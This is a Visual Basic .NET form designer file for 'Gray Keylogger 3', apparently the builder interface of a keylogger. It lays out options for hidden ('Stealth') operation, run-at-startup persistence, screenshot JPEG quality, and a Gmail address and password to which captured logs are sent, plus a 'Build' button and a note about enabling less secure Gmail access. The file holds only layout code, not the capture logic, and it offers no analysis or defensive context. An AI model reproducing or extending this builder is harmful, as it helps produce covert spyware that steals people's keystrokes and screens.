<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class GrayKeylogger3
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(GrayKeylogger3))
        Me.logsize = New System.Windows.Forms.TextBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.user = New System.Windows.Forms.TextBox()
        Me.gmail = New System.Windows.Forms.TextBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.pass = New System.Windows.Forms.TextBox()
        Me.Test = New System.Windows.Forms.Button()
        Me.Build = New System.Windows.Forms.Button()
        Me.Readme = New System.Windows.Forms.Button()
        Me.ShowHide = New System.Windows.Forms.Button()
        Me.LinkLabel1 = New System.Windows.Forms.LinkLabel()
        Me.stealth = New System.Windows.Forms.CheckBox()
        Me.target = New System.Windows.Forms.ComboBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Quality = New System.Windows.Forms.TrackBar()
        Me.ArgueBox = New System.Windows.Forms.TextBox()
        Me.language = New System.Windows.Forms.ComboBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.ErrorReporting = New System.Windows.Forms.CheckBox()
        Me.QualityPercentage = New System.Windows.Forms.Label()
        Me.iconbox = New System.Windows.Forms.CheckBox()
        Me.Startup = New System.Windows.Forms.CheckBox()
        CType(Me.Quality, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'logsize
        '
        Me.logsize.BackColor = System.Drawing.Color.Black
        Me.logsize.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.logsize.ForeColor = System.Drawing.Color.White
        Me.logsize.Location = New System.Drawing.Point(200, 19)
        Me.logsize.Multiline = True
        Me.logsize.Name = "logsize"
        Me.logsize.Size = New System.Drawing.Size(126, 38)
        Me.logsize.TabIndex = 0
        Me.logsize.Text = "10000"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.BackColor = System.Drawing.Color.Transparent
        Me.Label1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Label1.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.ForeColor = System.Drawing.Color.White
        Me.Label1.Location = New System.Drawing.Point(12, 18)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(123, 31)
        Me.Label1.TabIndex = 1
        Me.Label1.Text = "Log size"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Label2.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.ForeColor = System.Drawing.Color.White
        Me.Label2.Location = New System.Drawing.Point(12, 63)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(86, 31)
        Me.Label2.TabIndex = 5
        Me.Label2.Text = "Email"
        '
        'user
        '
        Me.user.BackColor = System.Drawing.Color.Black
        Me.user.Font = New System.Drawing.Font("Microsoft Sans Serif", 18.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.user.ForeColor = System.Drawing.Color.White
        Me.user.Location = New System.Drawing.Point(201, 61)
        Me.user.Multiline = True
        Me.user.Name = "user"
        Me.user.Size = New System.Drawing.Size(210, 38)
        Me.user.TabIndex = 4
        Me.user.Text = "hackrefisher"
        '
        'gmail
        '
        Me.gmail.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.gmail.Font = New System.Drawing.Font("Microsoft Sans Serif", 18.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gmail.ForeColor = System.Drawing.Color.White
        Me.gmail.Location = New System.Drawing.Point(417, 61)
        Me.gmail.Multiline = True
        Me.gmail.Name = "gmail"
        Me.gmail.ReadOnly = True
        Me.gmail.Size = New System.Drawing.Size(155, 38)
        Me.gmail.TabIndex = 6
        Me.gmail.Text = "@gmail.com"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.BackColor = System.Drawing.Color.Transparent
        Me.Label3.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Label3.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label3.ForeColor = System.Drawing.Color.White
        Me.Label3.Location = New System.Drawing.Point(12, 105)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(142, 31)
        Me.Label3.TabIndex = 8
        Me.Label3.Text = "Password"
        '
        'pass
        '
        Me.pass.BackColor = System.Drawing.Color.Black
        Me.pass.Font = New System.Drawing.Font("Microsoft Sans Serif", 18.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.pass.ForeColor = System.Drawing.Color.White
        Me.pass.Location = New System.Drawing.Point(201, 105)
        Me.pass.Multiline = True
        Me.pass.Name = "pass"
        Me.pass.PasswordChar = Global.Microsoft.VisualBasic.ChrW(42)
        Me.pass.Size = New System.Drawing.Size(272, 38)
        Me.pass.TabIndex = 7
        '
        'Test
        '
        Me.Test.BackColor = System.Drawing.Color.Black
        Me.Test.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.Test.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Test.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Test.ForeColor = System.Drawing.Color.White
        Me.Test.Location = New System.Drawing.Point(18, 291)
        Me.Test.Name = "Test"
        Me.Test.Size = New System.Drawing.Size(172, 45)
        Me.Test.TabIndex = 13
        Me.Test.Text = "Test"
        Me.Test.UseVisualStyleBackColor = False
        '
        'Build
        '
        Me.Build.BackColor = System.Drawing.Color.Black
        Me.Build.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Build.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Build.ForeColor = System.Drawing.Color.White
        Me.Build.Location = New System.Drawing.Point(209, 291)
        Me.Build.Name = "Build"
        Me.Build.Size = New System.Drawing.Size(172, 45)
        Me.Build.TabIndex = 14
        Me.Build.Text = "Build"
        Me.Build.UseVisualStyleBackColor = False
        '
        'Readme
        '
        Me.Readme.BackColor = System.Drawing.Color.Black
        Me.Readme.Cursor = System.Windows.Forms.Cursors.Help
        Me.Readme.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.Readme.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Readme.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Readme.ForeColor = System.Drawing.Color.White
        Me.Readme.Location = New System.Drawing.Point(399, 291)
        Me.Readme.Name = "Readme"
        Me.Readme.Size = New System.Drawing.Size(172, 45)
        Me.Readme.TabIndex = 18
        Me.Readme.Text = "Read"
        Me.Readme.UseVisualStyleBackColor = False
        '
        'ShowHide
        '
        Me.ShowHide.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.ShowHide.Cursor = System.Windows.Forms.Cursors.Default
        Me.ShowHide.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.ShowHide.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.ShowHide.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.0!, System.Drawing.FontStyle.Bold)
        Me.ShowHide.ForeColor = System.Drawing.Color.White
        Me.ShowHide.Location = New System.Drawing.Point(479, 106)
        Me.ShowHide.Name = "ShowHide"
        Me.ShowHide.Size = New System.Drawing.Size(93, 38)
        Me.ShowHide.TabIndex = 21
        Me.ShowHide.Text = "show"
        Me.ShowHide.TextAlign = System.Drawing.ContentAlignment.TopCenter
        Me.ShowHide.UseVisualStyleBackColor = False
        '
        'LinkLabel1
        '
        Me.LinkLabel1.ActiveLinkColor = System.Drawing.Color.Blue
        Me.LinkLabel1.BackColor = System.Drawing.Color.Transparent
        Me.LinkLabel1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.LinkLabel1.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.LinkLabel1.Font = New System.Drawing.Font("Microsoft Sans Serif", 20.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.LinkLabel1.LinkColor = System.Drawing.Color.Red
        Me.LinkLabel1.Location = New System.Drawing.Point(0, 339)
        Me.LinkLabel1.Name = "LinkLabel1"
        Me.LinkLabel1.Size = New System.Drawing.Size(583, 37)
        Me.LinkLabel1.TabIndex = 22
        Me.LinkLabel1.TabStop = True
        Me.LinkLabel1.Text = "Allow lessSecureApp n gmail before use"
        Me.LinkLabel1.TextAlign = System.Drawing.ContentAlignment.TopCenter
        '
        'stealth
        '
        Me.stealth.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.stealth.Font = New System.Drawing.Font("Microsoft Sans Serif", 14.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.stealth.ForeColor = System.Drawing.Color.White
        Me.stealth.Location = New System.Drawing.Point(479, 19)
        Me.stealth.Name = "stealth"
        Me.stealth.Size = New System.Drawing.Size(92, 38)
        Me.stealth.TabIndex = 23
        Me.stealth.Text = "Stealth"
        Me.stealth.UseVisualStyleBackColor = False
        '
        'target
        '
        Me.target.BackColor = System.Drawing.Color.Black
        Me.target.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.target.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.target.ForeColor = System.Drawing.Color.White
        Me.target.FormattingEnabled = True
        Me.target.ItemHeight = 25
        Me.target.Items.AddRange(New Object() {"WinExe", "Console", "Library"})
        Me.target.Location = New System.Drawing.Point(346, 150)
        Me.target.Name = "target"
        Me.target.Size = New System.Drawing.Size(116, 33)
        Me.target.TabIndex = 2
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.BackColor = System.Drawing.Color.Transparent
        Me.Label5.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Label5.Font = New System.Drawing.Font("Microsoft Sans Serif", 19.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label5.ForeColor = System.Drawing.Color.White
        Me.Label5.Location = New System.Drawing.Point(11, 195)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(167, 30)
        Me.Label5.TabIndex = 26
        Me.Label5.Text = "Jpeg Quality"
        '
        'Quality
        '
        Me.Quality.AutoSize = False
        Me.Quality.BackColor = System.Drawing.Color.Black
        Me.Quality.Location = New System.Drawing.Point(200, 194)
        Me.Quality.Maximum = 100
        Me.Quality.Minimum = 1
        Me.Quality.Name = "Quality"
        Me.Quality.Size = New System.Drawing.Size(214, 34)
        Me.Quality.TabIndex = 28
        Me.Quality.TickStyle = System.Windows.Forms.TickStyle.None
        Me.Quality.Value = 30
        '
        'ArgueBox
        '
        Me.ArgueBox.BackColor = System.Drawing.Color.Black
        Me.ArgueBox.Font = New System.Drawing.Font("Microsoft Sans Serif", 18.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ArgueBox.ForeColor = System.Drawing.Color.White
        Me.ArgueBox.Location = New System.Drawing.Point(19, 234)
        Me.ArgueBox.Multiline = True
        Me.ArgueBox.Name = "ArgueBox"
        Me.ArgueBox.ScrollBars = System.Windows.Forms.ScrollBars.Horizontal
        Me.ArgueBox.Size = New System.Drawing.Size(553, 54)
        Me.ArgueBox.TabIndex = 29
        Me.ArgueBox.Text = "Command line arguments"
        Me.ArgueBox.WordWrap = False
        '
        'language
        '
        Me.language.BackColor = System.Drawing.Color.Black
        Me.language.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.language.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.language.ForeColor = System.Drawing.Color.White
        Me.language.FormattingEnabled = True
        Me.language.ItemHeight = 25
        Me.language.Items.AddRange(New Object() {"C sharp", "Visual Basic"})
        Me.language.Location = New System.Drawing.Point(201, 150)
        Me.language.Name = "language"
        Me.language.Size = New System.Drawing.Size(139, 33)
        Me.language.TabIndex = 30
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.BackColor = System.Drawing.Color.Transparent
        Me.Label4.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Label4.Font = New System.Drawing.Font("Microsoft Sans Serif", 19.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label4.ForeColor = System.Drawing.Color.White
        Me.Label4.Location = New System.Drawing.Point(13, 150)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(133, 30)
        Me.Label4.TabIndex = 31
        Me.Label4.Text = "Language"
        '
        'ErrorReporting
        '
        Me.ErrorReporting.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.ErrorReporting.Font = New System.Drawing.Font("Microsoft Sans Serif", 14.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ErrorReporting.ForeColor = System.Drawing.Color.White
        Me.ErrorReporting.Location = New System.Drawing.Point(332, 19)
        Me.ErrorReporting.Name = "ErrorReporting"
        Me.ErrorReporting.Size = New System.Drawing.Size(141, 38)
        Me.ErrorReporting.TabIndex = 32
        Me.ErrorReporting.Text = "ShowErrors"
        Me.ErrorReporting.UseVisualStyleBackColor = False
        '
        'QualityPercentage
        '
        Me.QualityPercentage.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.QualityPercentage.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.QualityPercentage.Font = New System.Drawing.Font("Microsoft Sans Serif", 17.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.QualityPercentage.ForeColor = System.Drawing.Color.White
        Me.QualityPercentage.Location = New System.Drawing.Point(420, 195)
        Me.QualityPercentage.Name = "QualityPercentage"
        Me.QualityPercentage.Size = New System.Drawing.Size(74, 33)
        Me.QualityPercentage.TabIndex = 33
        Me.QualityPercentage.Text = "30%"
        '
        'iconbox
        '
        Me.iconbox.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.iconbox.Font = New System.Drawing.Font("Microsoft Sans Serif", 14.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.iconbox.ForeColor = System.Drawing.Color.White
        Me.iconbox.Location = New System.Drawing.Point(501, 192)
        Me.iconbox.Name = "iconbox"
        Me.iconbox.Size = New System.Drawing.Size(71, 33)
        Me.iconbox.TabIndex = 34
        Me.iconbox.Text = "Icon"
        Me.iconbox.UseVisualStyleBackColor = False
        '
        'Startup
        '
        Me.Startup.BackColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.Startup.Font = New System.Drawing.Font("Microsoft Sans Serif", 14.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Startup.ForeColor = System.Drawing.Color.White
        Me.Startup.Location = New System.Drawing.Point(468, 150)
        Me.Startup.Name = "Startup"
        Me.Startup.Size = New System.Drawing.Size(104, 33)
        Me.Startup.TabIndex = 35
        Me.Startup.Text = "Startup"
        Me.Startup.UseVisualStyleBackColor = False
        '
        'GrayKeylogger3
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.BackgroundImage = Global.Gray_Keylogger_3.My.Resources.Resources.spider
        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.ClientSize = New System.Drawing.Size(583, 376)
        Me.Controls.Add(Me.Startup)
        Me.Controls.Add(Me.iconbox)
        Me.Controls.Add(Me.QualityPercentage)
        Me.Controls.Add(Me.ErrorReporting)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.language)
        Me.Controls.Add(Me.ArgueBox)
        Me.Controls.Add(Me.Quality)
        Me.Controls.Add(Me.Label5)
        Me.Controls.Add(Me.target)
        Me.Controls.Add(Me.stealth)
        Me.Controls.Add(Me.LinkLabel1)
        Me.Controls.Add(Me.ShowHide)
        Me.Controls.Add(Me.Readme)
        Me.Controls.Add(Me.Build)
        Me.Controls.Add(Me.Test)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.pass)
        Me.Controls.Add(Me.gmail)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.user)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.logsize)
        Me.DoubleBuffered = True
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "GrayKeylogger3"
        Me.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Gray Keylogger 3"
        CType(Me.Quality, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents logsize As TextBox
    Friend WithEvents Label1 As Label
    Friend WithEvents Label2 As Label
    Friend WithEvents user As TextBox
    Friend WithEvents gmail As TextBox
    Friend WithEvents Label3 As Label
    Friend WithEvents pass As TextBox
    Friend WithEvents Test As Button
    Friend WithEvents Build As Button
    Friend WithEvents Readme As Button
    Friend WithEvents ShowHide As Button
    Friend WithEvents LinkLabel1 As LinkLabel
    Friend WithEvents stealth As CheckBox
    Friend WithEvents target As ComboBox
    Friend WithEvents Label5 As Label
    Friend WithEvents Quality As TrackBar
    Friend WithEvents ArgueBox As TextBox
    Friend WithEvents language As ComboBox
    Friend WithEvents Label4 As Label
    Friend WithEvents ErrorReporting As CheckBox
    Friend WithEvents QualityPercentage As Label
    Friend WithEvents iconbox As CheckBox
    Friend WithEvents Startup As CheckBox
End Class
